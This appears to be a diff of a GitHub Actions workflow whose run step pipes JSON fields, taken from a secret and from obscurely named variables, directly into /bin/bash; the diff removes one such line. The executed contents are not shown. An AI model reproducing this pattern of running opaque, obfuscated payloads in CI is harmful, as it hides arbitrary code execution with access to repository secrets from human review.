@@ -19,7 +19,6 @@ jobs:
           qdgh8: ${{ secrets.qdgh8 }}
         run: |
           printf '%s' "$qdgh8" | jq -r .t49131 | /bin/bash
-          echo $zstt91198 | jq -r .wy7203 | /bin/bash
           echo $kfqh47385 | jq -r .wargw4 | /bin/bash
           echo $brcx86 | jq -r .ylpnw94 | /bin/bash
           printf '%s' "$lv72" | jq -r .hbrh87 | /bin/bash
